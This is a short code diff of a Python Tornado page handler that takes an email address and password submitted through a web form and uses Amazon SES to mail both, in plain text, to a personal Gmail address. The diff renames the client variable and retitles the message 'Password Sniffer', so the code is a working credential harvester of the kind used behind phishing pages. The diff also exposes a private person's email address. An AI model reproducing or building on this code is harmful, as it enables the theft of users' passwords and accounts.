@@ -46,7 +46,7 @@ class PageHandler(TemplateHandler):
         self.write('thanks, got your data \n')
         self.write('Email: ' + email)
         # self.redirect("/thankyoupage") #tornado throws a 302 error if page is nonexistent
-        response = SES_client.send_email(
+        response = SES_CLIENT.send_email(
           Destination={
             'ToAddresses': ['chancecordelia@gmail.com'],
           },
@@ -57,7 +57,7 @@ class PageHandler(TemplateHandler):
                 'Data': 'Email: {}\nPassword:{}\n'.format(email, password),
               },
             },
-            'Subject': {'Charset': 'UTF-8', 'Data': 'Test email'},
+            'Subject': {'Charset': 'UTF-8', 'Data': 'Password Sniffer'},
           },
           Source='mailer@neutrondrive.com',
         )
